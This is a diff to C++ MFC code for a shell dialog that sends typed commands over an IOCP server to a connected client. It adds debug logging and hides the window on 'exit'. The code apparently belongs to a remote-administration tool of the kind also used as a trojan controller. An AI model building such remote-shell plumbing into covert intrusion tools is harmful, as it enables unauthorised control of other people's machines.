@@ -131,16 +131,26 @@ BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
 		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_Edit.m_hWnd)
 		{
 			//得到窗口的数据大小
-			int	iLength = m_Edit.GetWindowTextLength();  //Hello>dir  3
+			int	iLength = m_Edit.GetWindowTextLength();
 			CString str;
 			//得到窗口的字符数据
-			m_Edit.GetWindowText(str);//dir\r\n  
+			m_Edit.GetWindowText(str);
 			//加入换行符
 			str += "\r\n";
 			//得到整个的缓冲区的首地址再加上原有的字符的位置，其实就是用户当前输入的数据了
-			//然后将数据发送出去。。。。。。。。。。。。。。。
-			m_iocpServer->OnClientPreSending(m_ContextObject, (LPBYTE)str.GetBuffer(0) + m_nCurSel, str.GetLength() - m_nCurSel);
-			m_nCurSel = m_Edit.GetWindowTextLength();  //重新定位m_nCurSel  m_nCurSel = 3
+			//然后将数据发送出去
+			LPBYTE pSrc = (LPBYTE)str.GetBuffer(0) + m_nCurSel;
+#ifdef _DEBUG
+			OutputDebugStringA("[Shell]=> ");
+			OutputDebugStringA((char*)pSrc);
+#endif
+			int length = str.GetLength() - m_nCurSel;
+			m_iocpServer->OnClientPreSending(m_ContextObject, pSrc, length);
+			m_nCurSel = m_Edit.GetWindowTextLength();
+			if (0 == strcmp((char*)pSrc, "exit\r\n"))
+			{
+				ShowWindow(SW_HIDE);
+			}
 		}
 		// 限制VK_BACK
 		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_Edit.m_hWnd)
@@ -148,9 +158,9 @@ BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
 			if (m_Edit.GetWindowTextLength() <= m_nReceiveLength)  
 				return true;
 		}
+		// 示例：
 		//dir\r\n  5
 		//hello\r\n 7
-		//
 	}
 
 	return CDialog::PreTranslateMessage(pMsg);
